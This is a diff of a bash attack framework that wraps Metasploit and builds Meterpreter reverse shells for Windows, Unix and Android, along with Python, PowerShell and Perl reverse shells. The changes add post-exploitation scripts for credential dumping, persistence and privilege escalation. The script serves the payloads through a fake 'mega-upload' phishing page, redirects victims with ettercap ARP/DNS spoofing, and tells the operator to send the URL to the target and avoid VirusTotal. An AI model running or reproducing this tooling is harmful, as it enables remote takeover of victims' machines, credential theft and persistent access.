-N4m=$(zenity --title="☠ SFX Infection ☠" --text "WARNING BEFOR CLOSING THIS BOX:\n\nTo use SFX attack vector: $filename.py\nneeds to be compressed into one SFX\n\n1º compress $filename.py into one SFX\n2º store SFX into shell/output folder\n3º write the name of the SFX file\n4º press OK to continue...\n\nExample:output.exe" --entry --width 360) > /dev/null 2>&1
+
+
+# post-exploitation
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 305 --height 340) > /dev/null 2>&1
 
 
 cd $IPATH/templates/phishing
 cp $InJEc12 mega[bak].html
-sed "s|NaM3|$N4m|g" mega.html > copy.html
+sed "s|NaM3|$filename.py|g" mega.html > copy.html
 mv copy.html $ApAcHe/index.html > /dev/null 2>&1
 cd $IPATH/output
-cp $N4m $ApAcHe/$N4m > /dev/null 2>&1
+cp $filename.py $ApAcHe/$filename.py > /dev/null 2>&1
 echo "[☠] loading -> Apache2Server!"
 echo "---"
 echo "- SEND THE URL GENERATED TO TARGET HOST"
@@ -4858,16 +4926,17 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
 
         if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
-        cp $IPATH/output/$N4m $ApAcHe/$N4m
+        sed "s|NaM3|$filename.py|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$filename.py $ApAcHe/$filename.py
         echo "- ATTACK VECTOR: http://mega-upload.com"
+        echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-            xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -4875,11 +4944,12 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
-            mv final.log $N4m-$srvhost.log > /dev/null 2>&1
+            sed -i "s/\[1m\[31m//g" final.log
+            mv final.log $filename-$srvhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-            xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           fi
 
 
@@ -4887,6 +4957,7 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
 
 
         echo "- ATTACK VECTOR: http://$srvhost"
+        echo "- POST EXPLOIT : $P0"
         echo "---"
 
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
@@ -4894,7 +4965,7 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-            xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'"
+            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -4902,11 +4973,12 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
-            mv final.log $N4m-$srvhost.log > /dev/null 2>&1
+            sed -i "s/\[1m\[31m//g" final.log
+            mv final.log $filename-$srvhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-            xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'"
+            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
           fi
         fi
 
@@ -4916,7 +4988,7 @@ echo "[☠] Cleanning temp generated files..."
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 mv $IPATH/templates/web_delivery[bak].py $IPATH/templates/web_delivery.py > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
-rm $ApAcHe/$N4m > /dev/null 2>&1
+rm $ApAcHe/$filename.py > /dev/null 2>&1
 rm $ApAcHe/index.html > /dev/null 2>&1
 sleep 2
 clear
@@ -4973,6 +5045,10 @@ mv $filename.bat $IPATH/output/$filename.bat
 chmod +x $IPATH/output/$filename.bat
 
 
+# post-exploitation
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 305 --height 340) > /dev/null 2>&1
+
+
 cd $IPATH/templates/phishing
 cp $InJEc12 mega[bak].html
 sed "s|NaM3|$filename.bat|g" mega.html > copy.html
@@ -4989,13 +5065,14 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
         sed "s|NaM3|$filename.bat|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
         cp $IPATH/output/$filename.bat $ApAcHe/$filename.bat
         echo "- ATTACK VECTOR: http://mega-upload.com"
+        echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-            xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -5003,11 +5080,12 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
-            mv final.log $N4m-$srvhost.log > /dev/null 2>&1
+            sed -i "s/\[1m\[31m//g" final.log
+            mv final.log $filename-$srvhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-            xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           fi
 
 
@@ -5015,13 +5093,14 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
 
 
         echo "- ATTACK VECTOR: http://$srvhost"
+        echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-            xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'"
+            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -5029,11 +5108,12 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
-            mv final.log $N4m-$srvhost.log > /dev/null 2>&1
+            sed -i "s/\[1m\[31m//g" final.log
+            mv final.log $filename-$srvhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-            xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'"
+            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
           fi
         fi
 
@@ -5074,7 +5154,7 @@ cat << !
 +-------------------------------
 | SRVPORT : 8080
 | SRVHOST : $srvhost
-| FORMAT  : SH,PYTHON -> unix(s)
+| FORMAT  : SH,PYTHON -> UNIX(s)
 | PAYLOAD : python/meterpreter/reverse_tcp
 |_AGENT   : $IPATH/output/$N4m.deb
 
@@ -5214,6 +5294,7 @@ cat << !
 | FORMAT  : DALVIK -> ANDROID
 |_PAYLOAD : android/meterpreter/reverse_tcp
 
+
 !
 
 # use metasploit to build shellcode (msf encoded)
@@ -5240,6 +5321,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
+          sed -i "s/\[1m\[31m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -5281,6 +5363,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
+           sed -i "s/\[1m\[31m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
@@ -5307,6 +5390,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -5377,6 +5461,7 @@ cat << !
 | FORMAT  : EXE-SERVICE -> WINDOWS(SCM)
 |_PAYLOAD : $paylo
 
+
 !
 
 # use metasploit to build shellcode (msf encoded)
@@ -5402,6 +5487,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
+          sed -i "s/\[1m\[31m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -5458,6 +5544,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
+          sed -i "s/\[1m\[31m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -5485,6 +5572,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -5555,6 +5643,7 @@ cat << !
 | FORMAT  : $orm -> $Targ
 | PAYLOAD : $paa
 |_AGENT   : $IPATH/output/$N4m.docm
+
 
 !
 
@@ -5640,6 +5729,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
+          sed -i "s/\[1m\[31m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -5690,6 +5780,7 @@ fi
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -5717,6 +5808,7 @@ fi
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -5765,6 +5857,7 @@ cat << !
 | FORMAT  : PYTHON -> WINDOWS
 | PAYLOAD : python/meterpreter/reverse_tcp
 |_AGENT   : $IPATH/output/$N4m.ppsx
+
 
 !
 
@@ -5818,6 +5911,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
+          sed -i "s/\[1m\[31m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -5864,6 +5958,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -5891,6 +5986,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -6021,12 +6117,12 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
 
    elif [ "$InSh3ll" = "simple reverse python shell" ]; then
      cd $IPATH/templates/
-     N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell.py" --entry --width 330) > /dev/null 2>&1
+     N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell" --entry --width 330) > /dev/null 2>&1
      sed "s|IpAdDr|$lhost|" simple_shell.py > simple.raw
      sed "s|P0rT|$lport|" simple.raw > final.raw
      rm $IPATH/templates/simple.raw > /dev/null 2>&1
-     mv final.raw $IPATH/output/$N4m > /dev/null 2>&1
-     chmod +x $IPATH/output/$N4m > /dev/null 2>&1
+     mv final.raw $IPATH/output/$N4m.py > /dev/null 2>&1
+     chmod +x $IPATH/output/$N4m.py > /dev/null 2>&1
 
      echo "[✔] Building -> simple reverse python shell..."
      echo "---"
@@ -6041,20 +6137,20 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
      echo "---"
      sleep 3
-     zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m" --info > /dev/null 2>&1
+     zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m.py" --info > /dev/null 2>&1
      xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
      sleep 2
 
 
    elif [ "$InSh3ll" = "simple reverse python shell2" ]; then
      cd $IPATH/templates/
-     N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell.py" --entry --width 330) > /dev/null 2>&1
+     N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell" --entry --width 330) > /dev/null 2>&1
      sed "s|IpAdDr|$lhost|" simple_shell2.py > simple.raw
      sed "s|P0rT|$lport|" simple.raw > final.raw
      rm $IPATH/templates/simple.raw > /dev/null 2>&1
-     mv final.raw $IPATH/output/$N4m > /dev/null 2>&1
-     chmod +x $IPATH/output/$N4m > /dev/null 2>&1
-     chown $user $IPATH/output/$N4m > /dev/null 2>&1
+     mv final.raw $IPATH/output/$N4m.py > /dev/null 2>&1
+     chmod +x $IPATH/output/$N4m.py > /dev/null 2>&1
+     chown $user $IPATH/output/$N4m.py > /dev/null 2>&1
 
      echo "[✔] Building -> simple reverse python shell..."
      echo "---"
@@ -6070,19 +6166,19 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
      echo "---"
      sleep 3
-     zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m" --info > /dev/null 2>&1
+     zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m.py" --info > /dev/null 2>&1
      xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
      sleep 2
 
 
    elif [ "$InSh3ll" = "simple powershell shell" ]; then
      cd $IPATH/templates/
-     N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell.ps1" --entry --width 330) > /dev/null 2>&1
+     N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell" --entry --width 330) > /dev/null 2>&1
      sed "s|IpAdDr|$lhost|" simple_powershell.ps1 > simple.raw
      sed "s|P0rT|$lport|" simple.raw > final.raw
      rm $IPATH/templates/simple.raw > /dev/null 2>&1
-     mv final.raw $IPATH/output/$N4m > /dev/null 2>&1
-     chmod +x $IPATH/output/$N4m > /dev/null 2>&1
+     mv final.raw $IPATH/output/$N4m.ps1 > /dev/null 2>&1
+     chmod +x $IPATH/output/$N4m.ps1 > /dev/null 2>&1
 
      echo "[✔] Building -> simple powershell shell..."
      echo "---"
@@ -6098,7 +6194,7 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
      echo "---"
      sleep 3
-     zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m" --info > /dev/null 2>&1
+     zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m.ps1" --info > /dev/null 2>&1
      xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
      sleep 2
 
@@ -6150,12 +6246,12 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
 
    elif [ "$InSh3ll" = "perl-reverse-shell" ]; then
      cd $IPATH/templates/
-     N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell.pl" --entry --width 330) > /dev/null 2>&1
+     N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell" --entry --width 330) > /dev/null 2>&1
      sed "s|IpAdDr|$lhost|" perl-reverse-shell.pl > simple.raw
      sed "s|P0rT|$lport|" simple.raw > final.raw
      rm $IPATH/templates/simple.raw > /dev/null 2>&1
-     mv final.raw $IPATH/output/$N4m > /dev/null 2>&1
-     chmod +x $IPATH/output/$N4m > /dev/null 2>&1
+     mv final.raw $IPATH/output/$N4m.pl > /dev/null 2>&1
+     chmod +x $IPATH/output/$N4m.pl > /dev/null 2>&1
 
      echo "[✔] Building -> perl reverse shell..."
      echo "---"
@@ -6169,8 +6265,8 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      echo "- NETCAT: sudo nc -l -v $lhost -p $lport"
      echo "---"
      sleep 3
-     gedit $IPATH/output/$N4m & xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
-     zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m" --info > /dev/null 2>&1
+     gedit $IPATH/output/$N4m.pl & xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
+     zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m.pl" --info > /dev/null 2>&1
      sleep 2
 
 
